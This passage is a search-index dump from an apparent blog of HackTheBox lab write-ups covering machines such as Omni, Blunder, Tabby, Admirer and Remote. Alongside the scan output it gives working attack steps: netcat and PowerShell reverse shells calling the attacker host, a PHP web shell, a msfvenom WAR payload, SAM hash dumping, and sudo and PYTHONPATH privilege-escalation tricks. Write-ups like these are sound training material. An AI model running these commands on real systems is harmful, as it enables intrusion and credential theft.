PATH variable by adding current directory (which stores our chmod) Run suid binary And get our root shell ","date":"July 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/laboratory/images/laboratory.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/laboratory/","summary":"Laboratory Enumeration Nmap â””â”€$ nmap -Pn -sC -sV 10.10.10.216 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 18:25 BST Nmap scan report for 10.10.10.216 (10.10.10.216) Host is up (0.13s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 25ba648f799d5d95972c1bb25e9b550d (RSA) |_ 256 7720ffe946c068921a0b2129d153aa87 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.","tags":["HTB","gitlab","vhosts","cve-2020-10977","deserialization","hackerone","docker","ruby","irb","suid","path-hijack"],"title":"[HTB] Machine: Laboratory"},{"categories":null,"contents":"Omni Enumeration nmap â””â”€$ nmap -p135,5985,8080,29817,29819,29820 -Pn 10.10.10.204 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 19:00 BST Nmap scan report for 10.10.10.204 (10.10.10.204) Host is up (0.16s latency). PORT STATE SERVICE 135/tcp open msrpc 5985/tcp open wsman 8080/tcp open http-proxy 29817/tcp open unknown 29819/tcp open unknown 29820/tcp open unknown â””â”€$ nmap -p135,5985,8080,29817,29819,29820 -Pn -sC -sV 10.10.10.204 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 19:00 BST Nmap scan report for 10.10.10.204 (10.10.10.204) Host is up (0.14s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 5985/tcp open upnp Microsoft IIS httpd 8080/tcp open upnp Microsoft IIS httpd |_http-server-header: Microsoft-HTTPAPI/2.0 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=Windows Device Portal |_http-title: Site doesn\u0026#39;t have a title. 29817/tcp open unknown 29819/tcp open arcserve ARCserve Discovery 29820/tcp open unknown 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port29820-TCP:V=7.93%I=7%D=7/5%Time=64A5AFBD%P=x86_64-pc-linux-gnu%r(NU SF:LL,10,\u0026#34;\\*LY\\xa5\\xfb`\\x04G\\xa9m\\x1c\\xc9}\\xc8O\\x12\u0026#34;)%r(GenericLines,10,\u0026#34;\\ SF:*LY\\xa5\\xfb`\\x04G\\xa9m\\x1c\\xc9}\\xc8O\\x12\u0026#34;)%r(Help,10,\u0026#34;\\*LY\\xa5\\xfb`\\x04 SF:G\\xa9m\\x1c\\xc9}\\xc8O\\x12\u0026#34;)%r(JavaRMI,10,\u0026#34;\\*LY\\xa5\\xfb`\\x04G\\xa9m\\x1c\\xc SF:9}\\xc8O\\x12\u0026#34;); Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 78.05 seconds Port 8080 rpcclient Other open ports indicate that it uses Windows IOT Core https://social.msdn.microsoft.com/Forums/vstudio/en-US/75314423-de13-4eff-bd15-0fec8b9c1da4/ports-open?forum=WindowsIoT https://www.blackhat.com/docs/us-16/materials/us-16-Sabanal-Into-The-Core-In-Depth-Exploration-Of-Windows-10-IoT-Core-wp.pdf Foothold Googling more about the ports revealed the following github page indicating Sirep protocol Check the docs for more info about the We can test the exploit Now let\u0026rsquo;s try getting the reverse shell I tried running powershell -c iex(new-object net.webclient).downloadstring(\u0026quot;http://10.10.16.12:8000/shell.ps1\u0026quot;), which failed So I tried simply downloading the shell using Invoke-WebRequest which is worked But it is better to download it to the writable folder, for example to C:\\Windows\\System32\\spool\\drivers\\color I tried running powershell\u0026rsquo;s versions of reverse shell, had no success So I used nc: /c c:\\windows\\system32\\spool\\drivers\\color\\nc.exe -e cmd 10.10.16.12 6666 User If we check the c: drive, we have a data folder No users c:\\Users But there are users in c:\\Data\\Users\\ If we check the folders, we can the flags but they are PSCredential files We need a passwords to decrypt them Since we are SYSTEM we can dump the SAM hashes Start smbserver on attack box: impacket-smbserver share . -smb2support -username pentest -password pentest Mount the share to the box: net use \\\\10.10.16.12\\share /u:pentest pentest Dump the hives to the share: reg save HKLM\\sam \\\\10.10.16.12\\share\\sam reg save HKLM\\system \\\\10.10.16.12\\share\\system reg save HKLM\\security \\\\10.10.16.12\\share\\security Dump the hashes: impacket-secretsdump -sam sam -security security -system system LOCAL Crack the app user\u0026rsquo;s hash: hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt app:mesh5143 Creds work to access the page on port 8080 Get reverse shell Now we can decrypt the flag using Import-CliXml (Import-CliXml -Path user.txt).GetNetworkCredential().Password Root We find interesting files inside app\u0026rsquo;s folder: hardening.txt and iot-admin.xml iot-admin.xml is also PSCredential file We can decrypt the same way as the flag: (Import-CliXml -Path iot-admin.xml).GetNetworkCredential() | fl administrator:_1nt3rn37ofTh1nGz Let\u0026rsquo;s get reverse shell the same way as before via port 8080 (Import-CliXml -Path root.txt).GetNetworkCredential().Password ","date":"July 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/omni/images/omni.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/omni/","summary":"Omni Enumeration nmap â””â”€$ nmap -p135,5985,8080,29817,29819,29820 -Pn 10.10.10.204 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 19:00 BST Nmap scan report for 10.10.10.204 (10.10.10.204) Host is up (0.16s latency). PORT STATE SERVICE 135/tcp open msrpc 5985/tcp open wsman 8080/tcp open http-proxy 29817/tcp open unknown 29819/tcp open unknown 29820/tcp open unknown â””â”€$ nmap -p135,5985,8080,29817,29819,29820 -Pn -sC -sV 10.10.10.204 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 19:00 BST Nmap scan report for 10.","tags":["HTB","windows-iot-core","powershell-credentials","sirep","secretsdump","windows-device-portal"],"title":"[HTB] Machine: Omni"},{"categories":null,"contents":"Blunder Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.191 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 12:05 BST Nmap scan report for 10.10.10.191 (10.10.10.191) Host is up (0.10s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp closed ftp 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Blunder | A blunder of interesting facts |_http-generator: Blunder |_http-server-header: Apache/2.4.41 (Ubuntu) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.64 seconds Web server gobuster â””â”€$ gobuster dir -u http://10.10.10.191 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php,html =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.191 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php,html [+] Timeout: 10s =============================================================== 2023/07/01 14:00:27 Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 277] /about (Status: 200) [Size: 3281] /.php (Status: 403) [Size: 277] /0 (Status: 200) [Size: 7562] /admin (Status: 301) [Size: 0] [--\u0026gt; http://10.10.10.191/admin/] /install.php (Status: 200) [Size: 30] /robots.txt (Status: 200) [Size: 22] /todo.txt (Status: 200) [Size: 118] /usb (Status: 200) [Size: 3960] /LICENSE (Status: 200) [Size: 1083] Interesting paths Foothold Searchsploit We know from the note that there is a user named fergus Need to find version of the cms We can assume it\u0026rsquo;s version is 3.9.2 Let\u0026rsquo;s check an exploit for credential bruteforcing So I ran poc with rockyou wordlist, but no success Then I used cewl to create a wordlist from the webserver cewl http://10.10.10.191 \u0026gt; passwd.list Then I started the exploit fergus:RolandDeschain It seems that Bludit also has directory traversal vulnerability Let\u0026rsquo;s run that exploit Prepare payloads echo '\u0026lt;?php system($_REQUEST[\u0026quot;cmd\u0026quot;]); ?\u0026gt;' \u0026gt; evil.png echo \u0026quot;RewriteEngine off\u0026quot; \u0026gt; .htaccess echo \u0026quot;AddType application/x-httpd-php .png\u0026quot; \u0026gt;\u0026gt; .htaccess Rev shell: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.7 6666 \u0026gt;/tmp/f URL encoded:rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.16.7%206666%20%3E%2Ftmp%2Ff User Enumeration We can start with linpeas Or Start with /var/www Let\u0026rsquo;s search for files with password We found 2 users.php files for 3.10.0a and 3.9.2 versions We see a password for Hugo, which is a user on the box Crack the hash and try su hugo:Password120 Root Start with sudo -l We can run sudo as any user except root Let\u0026rsquo;s check the version just in case We have a bypass for this specific case sudo -u#-1 /bin/bash ","date":"July 1, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/blunder/images/blunder.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/blunder/","summary":"Blunder Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.191 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 12:05 BST Nmap scan report for 10.10.10.191 (10.10.10.191) Host is up (0.10s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp closed ftp 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Blunder | A blunder of interesting facts |_http-generator: Blunder |_http-server-header: Apache/2.4.41 (Ubuntu) Service detection performed. Please report any incorrect results at https://nmap.","tags":["HTB"],"title":"[HTB] Machine: Blunder"},{"categories":null,"contents":"Tabby Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.194 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 16:48 BST Nmap scan report for 10.10.10.194 (10.10.10.194) Host is up (0.18s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 453c341435562395d6834e26dec65bd9 (RSA) | 256 89793a9c88b05cce4b79b102234b44a6 (ECDSA) |_ 256 1ee7b955dd258f7256e88e65d519b08d (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat |_http-title: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 30.36 seconds Web Server and port 8080 gobuster â””â”€$ gobuster dir -u http://megahosting.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://megahosting.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/07/01 17:16:46 Starting gobuster in directory enumeration mode =============================================================== /news.php (Status: 200) [Size: 0] /files (Status: 301) [Size: 318] [--\u0026gt; http://megahosting.htb/files/] /index.php (Status: 200) [Size: 14175] /.php (Status: 403) [Size: 280] /assets (Status: 301) [Size: 319] [--\u0026gt; http://megahosting.htb/assets/] /Readme.txt (Status: 200) [Size: 1574] /.php (Status: 403) [Size: 280] Foothold LFI If we scan through a web server, we will find a /news.php?file= path We can try checking for LFI, which actually works According to the message from port 8080, the file with users should be etc/tomcat9/tomcat-users.xml Which returns nothing if we try to curl it If we google a bit, we find that Ubuntu might store the file in /usr/share/tomcat9/etc/ tomcat:$3cureP4s5w0rd123! 403 for accessing /manager But we have access to /host-manager But we have access to /manager/text based on manager-script permission from tomcat-users.xml - Commands So msfvenom -p java/shell_reverse_tcp LHOST=10.10.16.7 -f war -o shell.war LPORT=6666 curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/revshell --upload-file shell.war Launch listener and then curl http://10.10.10.194:8080/revshell User We saw from LFI that we have a user ash So let\u0026rsquo;s enumerate the box We found a backup file which belongs to ash I downloaded the file to my box cat 16162020_backup.zip | nc 10.10.16.7 7777 nc -lvnp 7777 \u0026gt; backup.zip Check with md5sum for corruptions The archive is protected with password, so I used john to crack it: admin@it I found nothing inside the archive But luckily ash reused password Root From the linpeas out I saw that ash was in adm and lxd groups Let\u0026rsquo;s use the following post Run these instructions on attack box #Install requirements sudo apt update sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools #Clone repo git clone https://github.com/lxc/distrobuilder #Make distrobuilder cd distrobuilder make #Prepare the creation of alpine mkdir -p $HOME/ContainerImages/alpine/ cd $HOME/ContainerImages/alpine/ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml #Create the container sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18 After running those we will have 2 new files, which we have to upload to target box I needed to move uploaded files to home folder since I couldn\u0026rsquo;t import the image Then I followed the instructions from the link Rooted lxc start privesc lxc exec privesc /bin/sh [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted ","date":"July 1, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/tabby/images/tabby.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/tabby/","summary":"Tabby Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.194 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 16:48 BST Nmap scan report for 10.10.10.194 (10.10.10.194) Host is up (0.18s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 453c341435562395d6834e26dec65bd9 (RSA) | 256 89793a9c88b05cce4b79b102234b44a6 (ECDSA) |_ 256 1ee7b955dd258f7256e88e65d519b08d (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: Tabby"},{"categories":null,"contents":"Admirer Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.187 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-03 18:30 BST Nmap scan report for 10.10.10.187 (10.10.10.187) Host is up (0.17s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) | ssh-hostkey: | 2048 4a71e92163699dcbdd84021a2397e1b9 (RSA) | 256 c595b6214d46a425557a873e19a8e702 (ECDSA) |_ 256 d02dddd05c42f87b315abe57c4a9a756 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-robots.txt: 1 disallowed entry |_/admin-dir |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Admirer Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 39.52 seconds Web server gobuster â””â”€$ gobuster dir -u http://10.10.10.187 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.187 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/07/03 18:33:05 Starting gobuster in directory enumeration mode =============================================================== /assets (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.187/assets/] /.php (Status: 403) [Size: 277] /index.php (Status: 200) [Size: 6051] /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.187/images/] /robots.txt (Status: 200) [Size: 138] Nothing on FTP Foothold If we check robots.txt we find admin-dir and possible username waldo But we can\u0026rsquo;t visit that page Let\u0026rsquo;s gobuster the admin-dir path Just like it was stated in the robots.txt â””â”€$ gobuster dir -u http://10.10.10.187/admin-dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.187/admin-dir [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== 2023/07/03 18:37:24 Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 277] /contacts.txt (Status: 200) [Size: 350] /.php (Status: 403) [Size: 277] /credentials.txt (Status: 200) [Size: 136] Let\u0026rsquo;s curl those endpoints Creds didn\u0026rsquo;t work for ssh, but work for ftp Let\u0026rsquo;s download files Start checking the files index.php has creds, but they don\u0026rsquo;t work neither for ssh nor ftp We also have a new directory /utility-scripts Another pair of creds, which don\u0026rsquo;t work Tried gobuster the directory, nothing was found Digging through google resulted in Adminer Considering the name of the box Admirer and db_admin file in /utility-scripts could be a viable path From the dump.sql we know that the admirerdb is the database If we try to connect to database using the creds found, we have no success We can make Adminer connect to our database Let\u0026rsquo;s configure and start mysql Connect to database for additional configuration The following [post] shows how to fix the issue: Host '10.10.10.187' is not allowed to connect to this MariaDB server And we are in This blog shows how we can get local file access via Adminer I tried loading /etc/passwd, but no success Then I remembered that waldo had hardcoded creds in index.php, so I tried loading them. The creds were different from the ones that we had from ftp backup waldo:\u0026amp;\u0026lt;h5b~yK3F#{PaPB\u0026amp;dA}{H\u0026gt; Let\u0026rsquo;s connect to ssh Root Let\u0026rsquo;s check sudo rights There is a SETENV option that I never seen before If we check man page ...if SETENV has been set for a command, the user may disable the env_reset option from the command line via the -E option... We have env_reset ...By default, the env_reset option is enabled. This causes commands to beexecuted with a new, minimal environment.... And secure_path ...secure_path Path used for every command run from sudo. If you donâ€™t trust the people running sudo to have a sane PATH environment variable you may want to use this... It implies that we should abuse environmental variables So let\u0026rsquo;s check the scripts We have admin_task.sh That handles the user input and performs the backup of specific files/directories based on the option chosen And backup.py that use make_archive function from shutil and archives /var/www/html directory The script is used in option 6 We can try to exploit backup.py (option 6 in the admin_tasks.sh) by changing PYTHONPATH and pass it sudo Currently PYTHONPATH is empty Setting it, will make python to look for modules in the current directory, then in the directory that we defined But PYTHONPATH is in the sudo\u0026rsquo;s default table of \u0026ldquo;bad\u0026rdquo; variables Yet there is a way to bypass it which is described here We also need to find a writable directory where we can work We can use /var/tmp Let\u0026rsquo;s create a python script shutil.py with a make_archive in /var/tmp I decided to copy /bin/bash and set it owned by root and SUID. Let\u0026rsquo;s run the script sudo PYTHONPATH=/var/tmp /opt/scripts/admin_tasks.sh 6 Run our bash file and get the flag ","date":"June 29, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/admirer/images/admirer.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/admirer/","summary":"Admirer Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.187 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-03 18:30 BST Nmap scan report for 10.10.10.187 (10.10.10.187) Host is up (0.17s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) | ssh-hostkey: | 2048 4a71e92163699dcbdd84021a2397e1b9 (RSA) | 256 c595b6214d46a425557a873e19a8e702 (ECDSA) |_ 256 d02dddd05c42f87b315abe57c4a9a756 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB","path-hijack","mysql","python-library-hijack","adminer","sudo"],"title":"[HTB] Machine: Admirer"},{"categories":null,"contents":"Remote Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.180 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-02 18:25 BST Nmap scan report for 10.10.10.180 (10.10.10.180) Host is up (0.13s latency). Not shown: 993 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT |_ftp-anon: Anonymous FTP login allowed (FTP code 230) 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Home - Acme Widgets 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 2049/tcp mountd | 100005 1,2,3 2049/tcp6 mountd | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 2049/tcp6 status | 100024 1 2049/udp status |_ 100024 1 2049/udp6 status 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 2049/tcp open mountd 1-3 (RPC #100005) Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -31s | smb2-time: | date: 2023-07-02T17:26:07 |_ start_date: N/A | smb2-security-mode: | 311: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 198.64 seconds Web server gobuster â””â”€$ gobuster dir -u http://10.10.10.180 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x asp,aspx --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.180 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: asp,aspx [+] Timeout: 10s =============================================================== 2023/07/02 19:58:02 Starting gobuster in directory enumeration mode =============================================================== /.aspx (Status: 200) [Size: 6693] /contact (Status: 200) [Size: 7880] /contact.aspx (Status: 200) [Size: 7880] /blog.aspx (Status: 200) [Size: 5001] /home.aspx (Status: 200) [Size: 6703] /blog (Status: 200) [Size: 5011] /home (Status: 200) [Size: 6703] /products (Status: 200) [Size: 5328] /products.aspx (Status: 200) [Size: 5328] /default.aspx (Status: 200) [Size: 6693] /people.aspx (Status: 200) [Size: 6739] /people (Status: 200) [Size: 6739] /product.aspx (Status: 500) [Size: 3420] /product (Status: 500) [Size: 3420] /Default.aspx (Status: 200) [Size: 6693] /Home (Status: 200) [Size: 6703] /Home.aspx (Status: 200) [Size: 6703] /Products (Status: 200) [Size: 5338] /Products.aspx (Status: 200) [Size: 5338] /Contact (Status: 200) [Size: 7890] /Contact.aspx (Status: 200) [Size: 7890] /install (Status: 302) [Size: 126] [--\u0026gt; /umbraco/] /Blog.aspx (Status: 200) [Size: 5011] /Blog (Status: 200) [Size: 5011] /People.aspx (Status: 200) [Size: 6749] /People (Status: 200) [Size: 6749] /Product (Status: 500) [Size: 3420] /Product.aspx (Status: 500) [Size: 3420] Seems like there is a UMBRACO CMS, based on /install redirect We have Remote Code Execution exploits But I need to find the version and creds to be able to perform them Nothing found on SMB and FTP We can also check nfs on port 2049 which was returned by nmap â””â”€$ showmount -e 10.10.10.180 Export list for 10.10.10.180: /site_backups (everyone) Foothold/User Let\u0026rsquo;s mount it If we check App_Data we will find SDF file Which is a file that contains a compact relational database saved in the SQL Server Compact (SQL CE) format, which is developed by Microsoft We can search for tools to open it But we can try using strings just to see its\u0026rsquo; contents: strings Umbraco.sdf | less Found some creds admin@htb.local:b8be16afba8c314ad33d812f22a04991b90e2aaa smith@htb.local:jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts= Crack them right away admin@htb.local:baconandcheese Creds work, now we can access CMS Let\u0026rsquo;s try one of the exploits Change login, host, password, cmd and proc.StartInfo.FileName. Let\u0026rsquo;s get a reverse shell cmd = /c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.16.12:8000/shell.ps1') Root Let\u0026rsquo;s upload winpeas and run it We have a list of interesting services TeamViewer There is a module in metasploit to gather TeamViewer credentials Let\u0026rsquo;s retrieve a password for registry: HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\TeamViewer\\\\Version7 OptionsPasswordAES, SecurityPasswordAES, SecurityPasswordExported, ServerPasswordAES, ProxyPasswordAES, LicenseKeyAES According to module, it looks like TeamViewer uses static key and iv Using metasploit\u0026rsquo;s module as reference we can write own script to decrypt the password You can use evil-winrm, psexec or wmiexec to connect as Administrator ","date":"June 29, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/remote/images/remote.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/remote/","summary":"Remote Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.180 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-02 18:25 BST Nmap scan report for 10.10.10.180 (10.10.10.180) Host is up (0.13s latency). Not shown: 993 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT |_ftp-anon: Anonymous FTP login allowed (FTP code 230) 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Home - Acme Widgets 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 2049/tcp mountd | 100005 1,2,3 2049/tcp6 mountd | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 2049/tcp6 status | 100024 1 2049/udp status |_ 100024 1 2049/udp6 status 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds?","tags":["HTB"],"title":"[HTB] Machine: Remote"},{"categories":null,"contents":"Servmon Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.184 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-30 18:47 BST Nmap scan report for 10.10.10.184 (10.10.10.184) Host is up (0.14s latency). Not shown: 991 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_02-28-22 07:35PM \u0026lt;DIR\u0026gt; Users 22/tcp open ssh OpenSSH for_Windows_8.0 (protocol 2.0) | ssh-hostkey: | 3072 c71af681ca1778d027dbcd462a092b54 (RSA) | 256 3e63ef3b6e3e4a90f34c02e940672e42 (ECDSA) |_ 256 5a48c8cd39782129effbae821d03adaf (ED25519) 80/tcp open http | fingerprint-strings: | GetRequest, HTTPOptions, RTSPRequest: | HTTP/1.1 200 OK | Content-type: text/html | Content-Length: 340 | Connection: close | AuthInfo: | \u0026lt;!DOCTYPE html PUBLIC \u0026#34;-//W3C//DTD XHTML 1.0 Transitional//EN\u0026#34; \u0026#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\u0026#34;\u0026gt; | \u0026lt;html xmlns=\u0026#34;http://www.w3.org/1999/xhtml\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; | \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; | window.location.href = \u0026#34;Pages/login.htm\u0026#34;; | \u0026lt;/script\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;/body\u0026gt; | \u0026lt;/html\u0026gt; | X11Probe: | HTTP/1.1 408 Request Timeout | Content-type: text/html | Content-Length: 0 | Connection: close |_ AuthInfo: 